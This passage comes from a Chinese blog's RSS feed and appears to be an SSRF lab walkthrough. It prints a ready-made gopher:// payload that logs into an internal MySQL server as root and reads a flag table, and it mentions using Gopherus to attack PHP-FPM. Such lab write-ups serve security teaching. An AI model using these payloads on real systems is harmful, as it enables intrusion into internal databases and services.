+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006012807865_hu_7ffa9762854edb51.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006012807865_hu_b30a69d0d0a78cfb.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="190"
+data-flex-basis="457px"
+&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;gopher://172.72.23.29:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%2e%74%65%73%74%01%00%00%00%01
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过页面传入得到flag：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;helloct{you_got_flag_29}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006012911925.png"
+width="847"
+height="381"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006012911925_hu_d4b4ef4a5d145002.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006012911925_hu_4f4b5ca0af9f3952.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="222"
+data-flex-basis="533px"
+&gt;&lt;/p&gt;
+&lt;h2 id="fpmfastcgi协议"&gt;fpm（FastCGI协议）
+&lt;/h2&gt;&lt;p&gt;通过&lt;a class="link" href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener"
+&gt;脚本&lt;/a&gt;生成payload：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006171527470.png"
+width="922"
+height="638"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006171527470_hu_46f4375dfe4d73af.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006171527470_hu_49edbf723ece3b1c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="144"
+data-flex-basis="346px"
+&gt;&lt;/p&gt;
+&lt;p&gt;通过页面传输，得到根目录下的文件：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006171625287.png"
+width="809"
+height="822"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006171625287_hu_b6b30942fb91be96.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006171625287_hu_936ed648c3e4fdc.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="98"
+data-flex-basis="236px"
+&gt;&lt;/p&gt;</description></item></channel></rss>
